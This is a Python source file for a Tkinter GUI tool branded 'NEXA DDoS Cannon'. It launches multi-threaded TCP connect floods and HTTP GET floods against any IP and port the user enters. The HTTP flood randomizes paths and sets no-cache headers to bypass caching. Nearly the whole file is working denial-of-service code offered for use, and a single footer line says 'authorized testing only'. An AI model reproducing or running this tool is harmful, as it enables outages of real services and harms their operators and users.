#!/usr/bin/env python3
"""
NEXA DDoS Cannon - Hyper Attack Tool
Author: Nafgyz Community
GUI Version with Real Attack Capability
"""
import threading
import socket
import random
import time
from queue import Queue
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from datetime import datetime

# ==================== CORE ATTACK ENGINE ====================
class DDoSAttack:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.packets_sent = 0
        self.queue = Queue()
        
    def tcp_flood(self, target_ip, target_port, threads_num, duration):
        """TCP Flood Attack - Layer 4"""
        self.attack_running = True
        self.packets_sent = 0
        
        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            start_time = time.time()
            
            while self.attack_running and (time.time() - start_time < duration):
                try:
                    sock.connect((target_ip, target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                    self.packets_sent += 1
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                except:
                    pass
                time.sleep(0.001)
            sock.close()
        
        # Start threads
        for _ in range(threads_num):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
    
    def http_flood(self, target_ip, target_port, threads_num, duration):
        """HTTP GET Flood - Layer 7"""
        self.attack_running = True
        self.packets_sent = 0
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]
        
        def flood():
            start_time = time.time()
            while self.attack_running and (time.time() - start_time < duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_ip, target_port))
                    
                    # Randomize requests to bypass caching [citation:3]
                    path = "/?" + str(random.randint(1000, 9999))
                    headers = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: no-cache\r\n\r\n"
                    )
                    sock.send(headers.encode())
                    self.packets_sent += 1
                    sock.close()
                except:
                    pass
        
        for _ in range(threads_num):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
    
    def stop_attack(self):
        """Stop all attack threads"""
        self.attack_running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=1)
        self.threads.clear()

# ==================== GUI APPLICATION ====================
class DDoSApp:
    def __init__(self):
        self.attack = DDoSAttack()
        self.window = tk.Tk()
        self.window.title("🔥 NEXA DDoS Cannon v2.0")
        self.window.geometry("750x650")
        self.window.configure(bg="#0a0a0a")
        
        # Style configuration
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TButton', font=('Consolas', 10))
        
        self.setup_ui()
    
    def setup_ui(self):
        # Header
        header = tk.Label(
            self.window,
            text="⚡ NEXA DDoS ATTACK CANNON ⚡",
            font=("Courier", 18, "bold"),
            fg="#00ff00",
            bg="#0a0a0a"
        )
        header.pack(pady=10)
        
        # Target Frame
        target_frame = tk.Frame(self.window, bg="#1a1a1a", relief=tk.RAISED, bd=2)
        target_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(
            target_frame,
            text="🎯 TARGET CONFIGURATION",
            font=("Arial", 12, "bold"),
            fg="#ff5555",
            bg="#1a1a1a"
        ).pack(pady=5)
        
        # IP Input
        ip_frame = tk.Frame(target_frame, bg="#1a1a1a")
        ip_frame.pack(pady=5)
        tk.Label(ip_frame, text="Target IP:", fg="white", bg="#1a1a1a").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(ip_frame, width=25, font=("Consolas", 10))
        self.ip_entry.pack(side=tk.LEFT, padx=10)
        self.ip_entry.insert(0, "192.168.1.1")
        
        # Port Input
        port_frame = tk.Frame(target_frame, bg="#1a1a1a")
        port_frame.pack(pady=5)
        tk.Label(port_frame, text="Target Port:", fg="white", bg="#1a1a1a").pack(side=tk.LEFT)
        self.port_entry = tk.Entry(port_frame, width=10, font=("Consolas", 10))
        self.port_entry.pack(side=tk.LEFT, padx=10)
        self.port_entry.insert(0, "80")
        
        # Attack Configuration
        config_frame = tk.Frame(self.window, bg="#1a1a1a", relief=tk.RAISED, bd=2)
        config_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(
            config_frame,
            text="⚙️ ATTACK PARAMETERS",
            font=("Arial", 12, "bold"),
            fg="#ffaa00",
            bg="#1a1a1a"
        ).pack(pady=5)
        
        # Threads
        threads_frame = tk.Frame(config_frame, bg="#1a1a1a")
        threads_frame.pack(pady=5)
        tk.Label(threads_frame, text="Threads:", fg="white", bg="#1a1a1a").pack(side=tk.LEFT)
        self.threads_slider = tk.Scale(
            threads_frame,
            from_=10,
            to=500,
            orient=tk.HORIZONTAL,
            length=200,
            bg="#1a1a1a",
            fg="white",
            troughcolor="#333333",
            highlightthickness=0
        )
        self.threads_slider.set(100)
        self.threads_slider.pack(side=tk.LEFT, padx=10)
        
        # Duration
        duration_frame = tk.Frame(config_frame, bg="#1a1a1a")
        duration_frame.pack(pady=5)
        tk.Label(duration_frame, text="Duration (sec):", fg="white", bg="#1a1a1a").pack(side=tk.LEFT)
        self.duration_entry = tk.Entry(duration_frame, width=10, font=("Consolas", 10))
        self.duration_entry.pack(side=tk.LEFT, padx=10)
        self.duration_entry.insert(0, "60")
        
        # Attack Type Selection
        type_frame = tk.Frame(config_frame, bg="#1a1a1a")
        type_frame.pack(pady=10)
        
        self.attack_type = tk.StringVar(value="http")
        tk.Radiobutton(
            type_frame,
            text="🔥 HTTP Flood (Layer 7)",
            variable=self.attack_type,
            value="http",
            bg="#1a1a1a",
            fg="#00ff00",
            selectcolor="black",
            font=("Arial", 10)
        ).pack(side=tk.LEFT, padx=20)
        
        tk.Radiobutton(
            type_frame,
            text="⚡ TCP Flood (Layer 4)",
            variable=self.attack_type,
            value="tcp",
            bg="#1a1a1a",
            fg="#00ff00",
            selectcolor="black",
            font=("Arial", 10)
        ).pack(side=tk.LEFT, padx=20)
        
        # Control Buttons
        button_frame = tk.Frame(self.window, bg="#0a0a0a")
        button_frame.pack(pady=15)
        
        self.start_btn = tk.Button(
            button_frame,
            text="🚀 LAUNCH ATTACK",
            command=self.start_attack,
            bg="#ff0000",
            fg="white",
            font=("Arial", 12, "bold"),
            width=20,
            height=2
        )
        self.start_btn.pack(side=tk.LEFT, padx=10)
        
        self.stop_btn = tk.Button(
            button_frame,
            text="⏹️ STOP ATTACK",
            command=self.stop_attack,
            bg="#444444",
            fg="white",
            font=("Arial", 12),
            width=15,
            height=2,
            state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        # Stats Display
        stats_frame = tk.Frame(self.window, bg="#1a1a1a", relief=tk.SUNKEN, bd=2)
        stats_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.stats_label = tk.Label(
            stats_frame,
            text="📊 Status: READY | Packets Sent: 0",
            font=("Consolas", 10),
            fg="#00ffff",
            bg="#1a1a1a"
        )
        self.stats_label.pack(pady=5)
        
        # Log Display
        log_frame = tk.Frame(self.window, bg="#1a1a1a")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(
            log_frame,
            text="📜 ATTACK LOGS",
            font=("Arial", 11, "bold"),
            fg="#ffaa00",
            bg="#1a1a1a"
        ).pack(anchor=tk.W)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=10,
            width=80,
            bg="#000000",
            fg="#00ff00",
            font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Footer
        footer = tk.Label(
            self.window,
            text="⚠️ For authorized testing only | NEXA AI v2.0 | © Nafgyz Community",
            font=("Arial", 8),
            fg="#888888",
            bg="#0a0a0a"
        )
        footer.pack(pady=5)
        
        # Start update thread
        self.update_stats()
    
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
    
    def start_attack(self):
        try:
            target_ip = self.ip_entry.get()
            target_port = int(self.port_entry.get())
            threads_num = self.threads_slider.get()
            duration = int(self.duration_entry.get())
            attack_type = self.attack_type.get()
            
            if not target_ip or target_port <= 0:
                messagebox.showerror("Error", "Invalid target configuration!")
                return
            
            self.log_message(f"🔥 Initializing {attack_type.upper()} attack on {target_ip}:{target_port}")
            self.log_message(f"⚡ Threads: {threads_num} | Duration: {duration}s")
            
            # Disable start button, enable stop button
            self.start_btn.config(state=tk.DISABLED, bg="#666666")
            self.stop_btn.config(state=tk.NORMAL, bg="#ff4444")
            
            # Start attack based on type
            if attack_type == "http":
                self.attack.http_flood(target_ip, target_port, threads_num, duration)
            else:
                self.attack.tcp_flood(target_ip, target_port, threads_num, duration)
            
            # Schedule attack stop
            self.window.after(duration * 1000, self.auto_stop)
            
        except Exception as e:
            self.log_message(f"❌ Error: {str(e)}")
            messagebox.showerror("Error", f"Attack failed: {str(e)}")
            self.stop_attack()
    
    def stop_attack(self):
        self.attack.stop_attack()
        self.log_message("🛑 Attack stopped manually")
        self.start_btn.config(state=tk.NORMAL, bg="#ff0000")
        self.stop_btn.config(state=tk.DISABLED, bg="#444444")
    
    def auto_stop(self):
        if self.attack.attack_running:
            self.attack.stop_attack()
            self.log_message("✅ Attack completed (timeout)")
            self.start_btn.config(state=tk.NORMAL, bg="#ff0000")
            self.stop_btn.config(state=tk.DISABLED, bg="#444444")
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack.attack_running:
            status = f"📊 Status: ATTACKING | Packets Sent: {self.attack.packets_sent}"
            self.stats_label.config(text=status, fg="#ff0000")
        else:
            status = f"📊 Status: READY | Packets Sent: {self.attack.packets_sent}"
            self.stats_label.config(text=status, fg="#00ffff")
        
        # Schedule next update
        self.window.after(500, self.update_stats)

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    print("""
    ███╗   ██╗███████╗██╗  ██╗ █████╗ 
    ████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗
    ██╔██╗ ██║█████╗   ╚███╔╝ ███████║
    ██║╚██╗██║██╔══╝   ██╔██╗ ██╔══██║
    ██║ ╚████║███████╗██╔╝ ██╗██║  ██║
    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
    DDoS Cannon v2.0 - Powered by NEXA AI
    """)
    
    app = DDoSApp()
    app.window.mainloop()